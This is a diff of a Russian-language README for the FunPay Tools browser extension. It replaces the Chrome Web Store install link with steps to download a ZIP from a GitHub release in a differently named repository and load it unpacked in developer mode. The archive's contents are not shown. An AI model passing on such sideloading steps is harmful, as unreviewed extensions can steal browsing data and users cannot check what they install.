@@ -267,9 +267,12 @@
 
 ### 📥 Установка
 
-1.  Перейдите в [**Chrome Web Store**](https://chromewebstore.google.com/detail/funpay-tools/pibmnjjfpojnakckilflcboodkndkibb/)
-2.  Нажмите кнопку "Установить".
-3.  После установки на панели инструментов браузера появится иконка FP Tools.
+1. Скачайте архив с расширением по ссылке: [**FunPay-Tools-new.zip**](https://github.com/ismailtu3455-prog/funpay-tools-free/releases/download/fdf/FunPay-Tools-new.zip)
+2. Распакуйте скачанный архив в любую удобную папку на вашем компьютере.
+3. Откройте браузер (Chrome, Яндекс, Edge и т.д.) и перейдите по адресу chrome://extensions/
+4. В правом верхнем углу включите **«Режим разработчика»** (Developer mode).
+5. Нажмите кнопку **«Загрузить распакованное расширение»** (Load unpacked) и выберите папку, в которую вы распаковали архив.
+6. Готово! Иконка FP Tools появится на панели браузера.
 
 ---
 
